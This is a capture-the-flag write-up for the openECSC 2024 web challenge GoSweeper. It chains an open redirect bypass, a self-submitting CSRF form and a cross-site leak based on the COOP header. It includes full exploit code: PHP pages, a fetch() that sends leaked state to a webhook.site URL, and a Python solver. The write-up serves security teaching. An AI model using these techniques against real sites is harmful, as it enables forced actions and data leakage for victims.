# openECSC 2024 - Round 2

## [web] GoSweeper (9 solves)

Let's play a game :D

Site: [http://gosweeper.challs.open.ecsc2024.it](http://gosweeper.challs.open.ecsc2024.it)

Author: Stefano Alberto <@Xato>

## Overview

The application is a simple copy of the minesweeper game. You can register with a random name, and the app keeps track of games played and won. To get the flag you need to win at least 20 games, without losing a single one. You can also request an admin (a headless bot) to clone your board and view it, but you can repeat this process a maximum of 5 times per board.

## Solution

The solution requires exploiting several vulnerabilities, first, we need to use an open redirect to force the bot to visit a server with our exploit.
After that, a csrf attack can be performed to force the bot to play a cell of our choice in the copy of our board.
Finally, it is possible to use an XSleak to determine whether the cell played contained a bomb or not.

In this way we can take advantage of the 5 attempts to try to solve the current board. If 5 leaks are enough, we can solve the board and win the game, otherwise we have to gernerate a new board by discarding the current one (this does not affect our score).


### Open redirect

When calling the bot, we only control the `cloneid` parameter of the following url visited by the hadless browser.

```go
map[string]string{
    "type": "request",
    "url":  CHALL_URL + "/clone?cloneid=" + cloneid,
},
```

However, in the source code we can find the `redirectMiddleware` that, for every authenticated request, checks for a url in the `redirect` parameter. This middleware checks the host of the redirect URL to be equal to the challege hostname with the following code.

```go
a, err := url.Parse(urlto)

if err == nil {
    // accept only http and https or relative url
    if a.Scheme != "" && a.Scheme != "http" && a.Scheme != "https" {
        http.Error(w, "URL parameter is invalid", http.StatusBadRequest)
        return
    }

    fmt.Println("Scheme: ", a.Scheme)
    fmt.Println("Host: ", a.Host)
    fmt.Println("HOST CHALL: ", r.Host)

    // only accept same host
    if a.Scheme != "" && a.Host != r.Host {
        http.Error(w, "URL parameter is invalid", http.StatusBadRequest)
        return
    }
}

if err != nil {
    log.Println(err)
}

http.Redirect(w, r, urlto, http.StatusFound)
```

The check is not performed if the URL parsing fails. This allows you to redirect to any URL that doesn't conform to the standard, but is still accepted by the browser. For example, it's possible to redirect to example.com by submitting `https:// @example.com` as the redirect URL. 

By injecting the redirect parameter in the bot request, we are able to force the admin into visiting our exploit server.


### CSRF

To play the game you need to pass the id of the cell to try using the `/guess` endpoint with the `guess` parameter set to a value between 0 and 48 identifying a cell of the board. The answer is the value of the cell, or 100 if the cell contains a bomb. If a cell with a bomb is guessed, the board is discarded and the user's score is updated accordingly.

The guess value is sent using an urlencoded form, we can exploit a CSRF to force the headless bot to submit a guess from our exploit server with a payload like this.

```html
<form action="https://gosweeper.challs.open.ecsc2024.it/guess" method="post">
    <input type="text" name="guess" value="0">
    <input type="submit" id="clickme">
</form>
<script>
    document.getElementById('clickme').click();
</script>
```

### XSleak

After forcing the guess submission we need a way to distinguish if the cell contained a bomb or if not. We can do this thanks to the presence of the Cross-Origin-Opener-Policy header, which is set by a middleware on all applications. This header prevents a CrossOrigin window from getting a reference to the window when opened with `window.open`. Therefore, when opening a page with this header, the value returned by `window.open` is `null` instead of a window object.

However, if the player has opened a cell with a bomb, any attempt to submit another guess before a new board is created will cause the server to panic. This behaviour prevents the server from sending the security headers, the server will not send a response (or we will get a 502 error if a proxy is present).

So we can submit a second guess exploiting the CSRF and check the value of the window object to determine whether the header was set or not (reflecting whether the tested cell contains a bomb). By repeating this process and implementing a script to solve the game, we are able to clear the entire board and win the game without ever losing.

Sometimes 5 leaks are not enough to solve the board and win the game, in these cases we just need to request a new board using the `/newboard` endpoint.

Note that this process is time sensitive, you will need to set timers in the exploit to be sure that the page was loaded when you leaked the state of the window object.
To force the headless into giving you more time to leak the correct information, you can include in you exploit a resource that takes a lot of time to fetch, in my exploit I added the following tag for this reason.

```html
<img src="https://httpbin.org/delay/5">
```



## Exploit

For my exploit I used a php server to host the exploit server and a Python script to implement the logic and solve the game.

To use it you need to save all these files in the same folder, start a php server and make it reachable by the bot using a service like `ngrok` or `Cloudflare Tunnel`.

### index.php

```html
<script>
    window.open('https://gosweeper.challs.open.ecsc2024.it/clone?cloneid=3717c7e4415fc09a442b7dc38a367055');
    window.open('/x.php' + window.location.search);
</script>

<img src="https://httpbin.org/delay/5">
```

### x.php

```html
<script>
    setTimeout(function() {
        window.open('/submit.php' + window.location.search);
        
        setTimeout(function() {
            w = window.open('/submit.php' + window.location.search);
        }, 1000);

        setTimeout(function() {
            console.log('Bomb?  ' + (w.window != null));
            fetch('https://webhook.site/2efb040f-3aa3-4050-9e4f-416854b814c3/?bomb=' + (w.window != null));
        }, 4000);
    }, 1000);
</script>
```

### submit.php
```html
<form action="https://gosweeper.challs.open.ecsc2024.it/guess" method="post">
    <input type="text" name="guess" value="<?php echo $_GET['i'];?>">
    <input type="submit" id="clickme">
</form>
<script>

    document.getElementById('clickme').click();

</script>
```

### exp.py

```py
'''
Usage

php -S localhost:8001
cloudflared tunnel --url http://localhost:8001
# ngrok http 8001

# put the cloudflare / ngrok url in exploit_url
python3 exp.py
'''

import requests
import re
import time
import sys


chall_url = "https://gosweeper.challs.open.ecsc2024.it"
exploit_url = "https://barry-perhaps-cannon-domains.trycloudflare.com"

exploit_url = exploit_url.replace("://", ":// @")
DIM = 7
userid = None

if len(sys.argv) > 1:
    userid = sys.argv[1]

r = requests.post('https://webhook.site/token')
token_id = r.json()['uuid']

webhook_url = f'https://webhook.site/{token_id}/'

print("Webhook URL: " + webhook_url)

s = requests.session()

if userid:
    print("Logging in")
    r = s.post(chall_url + "/login", data={"userid": userid, "password": "password"})

    assert r.status_code == 200
    assert 'User ID' in r.text

    print("Logged in")
else:
    print("Registering user")
    r = s.get(chall_url + "/register")

    m = re.search(r'<code>(.*)</code>', r.text)

    assert m is not None

    userid = m.group(1)

    print("User ID: " + userid)


print("Creating board")
s.get(chall_url + "/board")

print("Adapting exploit")

with open("index.php", "r") as f:
    exploit = f.read()

exploit = re.sub(r"cloneid=(\w+)'", f"cloneid={userid}'", exploit)
exploit = re.sub(r"https?://[\w\:\-\/\.]+/clone", f"{chall_url}/clone", exploit)

with open("index.php", "w") as f:
    f.write(exploit)

with open("x.php", "r") as f:
    exploit = f.read()

exploit = re.sub(r"'[\w\:\-\/\.]+\?bomb", f"'{webhook_url}?bomb", exploit)

with open("x.php", "w") as f:
    f.write(exploit)

with open("submit.php", "r") as f:
    exploit = f.read()

exploit = re.sub(r"https?://[\w\:\-\/\.]+/guess", f"{chall_url}/guess", exploit)

with open("submit.php", "w") as f:
    f.write(exploit)


def test_board(i=0):
    data = {"cloneid": "aaa&redirect=" + exploit_url + "/?i=" + str(i)}
    r = s.post(chall_url + "/checkboard", data=data)

    for _ in range(15):
        r = requests.get('https://webhook.site/token/'+ token_id +'/requests')

        if len(r.json()['data']) != 0:

            bomb = True
            for request in r.json()['data']:
                print(request['url'] + '    -  ' + request['uuid'])
                if 'bomb=false' in request['url']:
                    bomb = False

                # Delete request
                r = requests.delete('https://webhook.site/token/'+ token_id + '/request/' + request['uuid'])
                assert r.status_code == 200
            
            return bomb

        time.sleep(2)

    raise Exception("No requests received")


print('\n------- STARTING EXPLOIT -------\n')

def get_neighbours(i):
    x = i % DIM
    y = i // DIM
    neighbours = []

    for dx in range(-1, 2):
        for dy in range(-1, 2):
            if 0 <= x + dx < DIM and 0 <= y + dy < DIM and (dx != 0 or dy != 0):
                neighbours.append((x + dx) + DIM * (y + dy))

    return neighbours


def playgame():
    board = [-1] * (DIM * DIM)

    def solve(i):
        if board[i] == 100:
            return set()
        if board[i] == -1:
            raise Exception("Cell not guessed yet")
        
        ns = get_neighbours(i)
        new_guesses = []

        bomb_count = 0
        unknown_count = 0
        for n in ns:
            if board[n] == 100:
                bomb_count += 1
            if board[n] == -1:
                unknown_count += 1

        if bomb_count == board[i]:
            for n in ns:
                if board[n] == -1:
                    r = s.post(chall_url + "/guess", data={"guess": str(n)})
                    try:
                        board[n] = int(r.text)
                    except:
                        print(r.text)
                        print("FAILED WHILE GUESSING " + str(n))
                        raise                    
                    #print("Guess: " + str(n) + " -> " + str(board[n]))
                    print('.', end='', flush=True)
                    new_guesses.append(n)
        elif unknown_count == board[i] - bomb_count:
            for n in ns:
                if board[n] == -1:
                    board[n] = 100
                    print('.', end='', flush=True)
                    #print("Bomb: " + str(n))
                    new_guesses.append(n)

        if len(new_guesses) > 0:
            guess_neighbours = set()

            for n in new_guesses:
                solve(n)

                for nn in get_neighbours(n):
                    guess_neighbours.add(nn)

            for n in guess_neighbours:
                if board[n] != -1:
                    solve(n)

            solve(i)

    still_unknown = set([0])

    n_test = 0

    while len(still_unknown) > 0 and n_test < 5:
        i = still_unknown.pop()

        print(f"Testing cell {i}...")
        bomb = test_board(i)
        n_test += 1
        print(f"Cell {i} is a bomb: {bomb}")

        if bomb:
            board[i] = 100
        else:
            r = s.post(chall_url + "/guess", data={"guess": str(i)})
            try:
                board[i] = int(r.text)
            except:
                print(r.text)
                print("FAILED WHILE GUESSING " + str(i))
                raise
            # print(f"Guess: {i} -> " + str(board[0]))


            solve(i)

        for x in get_neighbours(i):
            if board[x] != -1 and board[x] != 100:
                solve(x)

        still_unknown = set()
        for j in range(DIM * DIM):
            if board[j] != -1 and board[j] != 100:
                for n in get_neighbours(j):
                    if board[n] == -1:
                        still_unknown.add(n)

        print("\nBoard")
        for j in range(DIM):
            print("\t".join(str(x) for x in board[j * DIM:j * DIM + DIM]))

        print("Still unknown: " + str(still_unknown))

        if board.count(-1) > ((DIM*DIM*80)//100):
            print("Doens't look good, skipping")
            return False

    r = s.get(chall_url + "/checkwin")

    return r.text == "true"

game = 0
i = 0

while game < 20:
    i += 1
    print("___ Playing game " + str(i) + " ___ (user id: " + userid + ")")
    if playgame():
        game += 1
        print(f"!!!  You won ({game})  !!!")

    r = s.get(chall_url + "/")
    m = re.search(r'Won games: (\d+) / (\d+)', r.text)
    print('\n' + m[0] + '\n')

    assert m[2] == m[1]
    print("Creating new board")
    s.get(chall_url + "/newboard")

print("Done")
print("User ID: " + userid)

r = s.get(chall_url + "/")
m = re.search(r'openECSC\{.*\}', r.text)
print(m[0])
```